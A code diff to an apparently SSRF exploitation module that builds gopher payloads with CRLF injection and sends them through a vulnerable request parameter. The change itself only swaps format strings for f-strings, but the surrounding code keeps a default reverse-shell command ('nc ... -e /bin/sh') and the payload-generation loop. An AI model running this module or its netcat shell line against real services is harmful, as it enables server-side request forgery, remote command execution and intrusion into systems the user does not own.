@@ -13,7 +13,7 @@ class exploit():
     SERVICE_DATA = "/bin/nc 127.0.0.1 4444 -e /bin/sh &"
 
     def __init__(self, requester, args):
-        logging.info("Module '{}' launched !".format(name))
+        logging.info(f"Module '{name}' launched !")
         gen_hosts = gen_ip_list("127.0.0.1", args.level)
         self.SERVICE_PORT = input("Service Port: ")
         self.SERVICE_DATA = "%0d%0a"+urllib.parse.quote(input("Service Data: "))
@@ -22,9 +22,9 @@ class exploit():
             payload = wrapper_gopher(self.SERVICE_DATA, gen_host, self.SERVICE_PORT)
             
             if args.verbose == True:
-                logging.info("Generated payload : {}".format(payload))
+                logging.info(f"Generated payload : {payload}")
 
             r = requester.do_request(args.param, payload)
 
             if args.verbose == True:
-                logging.info("Module '{}' ended !".format(name))
+                logging.info(f"Module '{name}' ended !")
